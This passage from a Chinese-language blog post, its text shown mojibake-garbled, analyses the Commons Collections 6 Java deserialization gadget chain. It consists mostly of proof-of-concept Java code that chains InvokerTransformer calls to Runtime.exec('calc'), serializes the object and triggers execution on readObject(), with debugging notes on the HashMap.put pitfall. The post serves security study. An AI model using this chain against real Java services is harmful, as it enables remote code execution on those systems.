                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token comment">//åˆ›å»ºinvokerTransformerï¼Œå¹¶åˆ©ç”¨constructorå¯¹iMethodNameã€iParamTypesã€iArgsè¿›è¡Œèµ‹å€¼</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
        <span class="token comment">//å°†ä¸Šé¢çš„æ•°ç»„ç”¨chainedTransformerä¸²èµ·æ¥ï¼Œæ•°ç»„é‡Œçš„transformerä¼šè¢«æŒ¨ä¸ªæ‰§è¡Œtransform()æ–¹æ³•</span>
        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map</span> innerMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        innerMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map</span> lazyMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span>chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//return a new lazyMap</span>
        <span class="token class-name">TiedMapEntry</span> tiedMapEntry <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span><span class="token string">"leihehe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è®©TiedMapEntryé‡Œçš„mapä¸ºlazyMap,keyéšæ„</span>
        <span class="token class-name">Map</span> serMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        serMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>tiedMapEntry<span class="token punctuation">,</span><span class="token string">"111"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//åºåˆ—åŒ–</span>
        <span class="token class-name">FileOutputStream</span> fileOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"lz.cer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectOutputStream</span> objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>fileOutputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>
        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>serMap<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åºåˆ—åŒ–</span>
        objectOutputStream<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        objectOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        fileOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">/*
         * æœåŠ¡ç«¯ååºåˆ—åŒ–è¯»å–ï¼Œå¹¶è§¦å‘æ¼æ´
         * */</span>
        <span class="token comment">//ååºåˆ—åŒ–</span>
<span class="token comment">//        FileInputStream fileInputStream = new FileInputStream("lz.cer");</span>
<span class="token comment">//        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);</span>
<span class="token comment">//        objectInputStream.readObject();//åªéœ€è¦readObject()å°±ä¼šè§¦å‘æ¼æ´</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å¥‡æ€ªçš„æ˜¯ï¼Œæˆ‘ä»¬å¹¶æ²¡æœ‰ååºåˆ—åŒ–ï¼Œä½†è®¡ç®—å™¨ä¾ç„¶å¼¹å‡ºæ¥äº†ï¼Œè¯´æ˜è¿™é‡ŒæŸå¤„åˆè§¦å‘äº†ä¸€æ¬¡å‘½ä»¤æ‰§è¡Œã€‚</p>
<h5 id="HashMap-put-çš„é—®é¢˜"><a href="#HashMap-put-çš„é—®é¢˜" class="headerlink" title="HashMap.put()çš„é—®é¢˜"></a>HashMap.put()çš„é—®é¢˜</h5><p>è¿˜è®°å¾—æˆ‘ä»¬ä¹‹å‰æŸ¥æ‰¾å“ªäº›åœ°æ–¹è°ƒç”¨äº†HashMap.hash()å—ï¼Œé‚£é‡Œè²Œä¼¼å‡ºç°äº†å¾ˆå¤šåœ°æ–¹è°ƒç”¨ã€‚å…¶ä¸­ä¸€ä¸ªåœ°æ–¹ <code>put()</code>æ–¹æ³•é‡Œï¼Œä¹Ÿå¯¹<code>hash()</code>è¿›è¡Œäº†è°ƒç”¨ï¼Œ<strong>æ­£å¥½æˆ‘ä»¬è¦åœ¨ç”Ÿæˆpayloadçš„æ—¶å€™putè¿›key-valueå¯¹</strong>ï¼Œé‚£è¯¥æ€æ ·æ‰èƒ½è®©ä»–åœ¨ç”Ÿæˆpayloadçš„æ—¶å€™ä¸è§¦å‘ï¼Ÿ</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">V</span> <span class="token function">put</span><span class="token punctuation">(</span><span class="token class-name">K</span> key<span class="token punctuation">,</span> <span class="token class-name">V</span> value<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>table <span class="token operator">==</span> EMPTY_TABLE<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">inflateTable</span><span class="token punctuation">(</span>threshold<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token function">putForNullKey</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> hash <span class="token operator">=</span> <span class="token function">hash</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è¿™é‡Œä¹Ÿè°ƒç”¨äº†hashï¼Œå¯¼è‡´åé¢æ¼æ´è§¦å‘äº†ã€‚</span>
    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token function">indexFor</span><span class="token punctuation">(</span>hash<span class="token punctuation">,</span> table<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Entry</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">K</span><span class="token punctuation">,</span><span class="token class-name">V</span><span class="token punctuation">></span></span> e <span class="token operator">=</span> table<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> e <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">;</span> e <span class="token operator">=</span> e<span class="token punctuation">.</span>next<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//æŠŠkey-valueæ”¾å…¥Entry&lt;K,V></span>
        <span class="token class-name">Object</span> k<span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token punctuation">.</span>hash <span class="token operator">==</span> hash <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>k <span class="token operator">=</span> e<span class="token punctuation">.</span>key<span class="token punctuation">)</span> <span class="token operator">==</span> key <span class="token operator">||</span> key<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">V</span> oldValue <span class="token operator">=</span> e<span class="token punctuation">.</span>value<span class="token punctuation">;</span>
            e<span class="token punctuation">.</span>value <span class="token operator">=</span> value<span class="token punctuation">;</span>
            e<span class="token punctuation">.</span><span class="token function">recordAccess</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> oldValue<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    modCount<span class="token operator">++</span><span class="token punctuation">;</span>
    <span class="token function">addEntry</span><span class="token punctuation">(</span>hash<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<p>å…¶å®åˆšå¼€å§‹åˆ†æçš„æ—¶å€™æ€»è§‰å¾—è¿™ä¸€å¹•ä¼¼æ›¾ç›¸è¯†ï¼Œæ„Ÿè§‰å¥½åƒè‡ªå·±ä¹‹å‰åˆ†æè¿‡<code>put</code>é‡å¤æ‰§è¡Œå‘½ä»¤çš„è¿™ç§ç±»ä¼¼çš„æƒ…å†µã€‚åæ¥å»ç½‘ä¸ŠæŸ¥äº†ä¸‹ï¼Œå‘ç°è¿™ä¸æ˜¯<strong>URLDNS</strong>çš„å†…å®¹å—ï¼Ÿ</p>
<p>å› ä¸ºè§¦å‘çš„åœ°æ–¹åœ¨<code>LazyMap.get() -&gt; ChainedTransformer.transform()</code></p>
<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨æ„é€ LazyMapçš„æ—¶å€™è®©ä»–æ‰§è¡Œä¸€ä¸ªæ— æ•ˆçš„ChainedTransformer,ç„¶åæœ€åå†ä¼ å…¥çœŸæ­£æœ‰ç”¨çš„<code>transformer</code></p>
<p><strong>POCå¦‚ä¸‹ï¼š</strong></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CommonsCollections6</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span> <span class="token punctuation">&#123;</span>

        <span class="token comment">/*
         * å®¢æˆ·ç«¯æ„é€ payloadï¼Œå¹¶åºåˆ—åŒ–æ–‡ä»¶
         * */</span>

        <span class="token comment">//å†™ä¸€ä¸ªfakeçš„trasnformers</span>
        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> fakeTransformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>
                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
        <span class="token comment">//è¿™æ˜¯çœŸçš„transformer</span>
        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>
                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment">//è¿”å›Runtime Class</span>
                <span class="token comment">//è·å–getRuntimeæ–¹æ³•</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getDeclaredMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token comment">//call getRuntimeæ–¹æ³•å¾—åˆ°Runtimeå®ä¾‹</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token comment">//åˆ›å»ºinvokerTransformerï¼Œå¹¶åˆ©ç”¨constructorå¯¹iMethodNameã€iParamTypesã€iArgsè¿›è¡Œèµ‹å€¼</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
        <span class="token comment">//å°†ä¸Šé¢çš„æ•°ç»„ç”¨chainedTransformerä¸²èµ·æ¥ï¼Œæ•°ç»„é‡Œçš„transformerä¼šè¢«æŒ¨ä¸ªæ‰§è¡Œtransform()æ–¹æ³•</span>
        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>fakeTransformers<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map</span> innerMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        innerMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map</span> lazyMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span>chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//return a new lazyMap</span>
        <span class="token class-name">TiedMapEntry</span> tiedMapEntry <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span><span class="token string">"leihehe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è®©TiedMapEntryé‡Œçš„mapä¸ºlazyMap,keyéšæ„</span>
        <span class="token class-name">Map</span> serMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        serMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>tiedMapEntry<span class="token punctuation">,</span><span class="token string">"111"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        
        <span class="token comment">/* æŠŠæœ‰ç”¨çš„transformeræ¢å›æ¥ */</span>
        <span class="token class-name">Field</span> myTransformers <span class="token operator">=</span> chainedTransformer<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"iTransformers"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        myTransformers<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        myTransformers<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>chainedTransformer<span class="token punctuation">,</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//åºåˆ—åŒ–</span>
        <span class="token class-name">FileOutputStream</span> fileOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"lz.cer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectOutputStream</span> objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>fileOutputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>
        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>serMap<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åºåˆ—åŒ–</span>
        objectOutputStream<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        objectOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        fileOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">/*
         * æœåŠ¡ç«¯ååºåˆ—åŒ–è¯»å–ï¼Œå¹¶è§¦å‘æ¼æ´
         * */</span>
        <span class="token comment">//ååºåˆ—åŒ–</span>
        <span class="token class-name">FileInputStream</span> fileInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"lz.cer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectInputStream</span> objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>fileInputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>
        objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åªéœ€è¦readObject()å°±ä¼šè§¦å‘æ¼æ´</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å¥‡æ€ªçš„æ˜¯ï¼Œåºåˆ—åŒ–æ—¶ä¸å¼¹è®¡ç®—å™¨äº†ï¼Œå¯æ˜¯ååºåˆ—åŒ–çš„æ—¶å€™ä¹Ÿæ²¡æœ‰å¼¹è®¡ç®—å™¨ -ã€‹ æˆ‘ä»¬æ²¡æœ‰æˆåŠŸè§¦å‘æ¼æ´ã€‚</p>
<p>é—®é¢˜å‡ºåœ¨å“ªé‡Œå‘¢ï¼Ÿ</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211204162857604.png" alt="image-20211204162857604" loading="lazy"></p>
<p>æˆ‘ä»¬å‘ç°æ‰§è¡Œåˆ°<code>putForCreate</code>çš„æ—¶å€™ï¼Œè¢«ä¼ è¿‡å»çš„keyå€¼æ˜¯<code>TiedMapEntry</code>ä¸­çš„keyå€¼ï¼Œè€Œå¹¶éæˆ‘ä»¬æƒ³è¦çš„<code>tiedMapEntry</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬çŒœæµ‹æŸä¸ªåœ°æ–¹å°†<code>TiedMapEntry</code>ä¸­çš„keyå€¼ç»™åŠ åˆ°mapé‡Œå»äº†ã€‚</p>
<p>è·Ÿè¸ªåå‘ç°é—®é¢˜å‡ºåœ¨<strong>LazyMap.get():</strong></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token class-name">Object</span> key<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">super</span><span class="token punctuation">.</span>map<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Object</span> value <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>factory<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">super</span><span class="token punctuation">.</span>map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> value<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span>map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>åœ¨è¿™é‡Œæˆ‘ä»¬çš„factoryæ˜¯<code>fakeTransform</code>,keyæ˜¯<code>leihehe</code>ï¼Œåœ¨<code>super.map.put(key, value);</code>å¤„ï¼ŒTiedMapEntryè¢«æ·»åŠ äº†ä¸€ä¸ªkeyå€¼</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211204183033871.png" alt="image-20211204183033871" loading="lazy"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211204183536474.png" alt="image-20211204183536474" loading="lazy"></p>
<p>å¯¼è‡´ååºåˆ—åŒ–æ¼æ´è§¦å‘å¤±è´¥ã€‚</p>
<p>æ‰€ä»¥æˆ‘ä»¬çš„<strong>è§£å†³æ–¹æ³•</strong>å¦‚ä¸‹ï¼š</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">lazyMap<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">"leihehe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h5 id="POCæ„é€ "><a href="#POCæ„é€ " class="headerlink" title="POCæ„é€ "></a>POCæ„é€ </h5><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>keyvalue<span class="token punctuation">.</span></span><span class="token class-name">TiedMapEntry</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span></span><span class="token class-name">BadAttributeValueExpException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CommonsCollections6</span> <span class="token punctuation">&#123;</span>
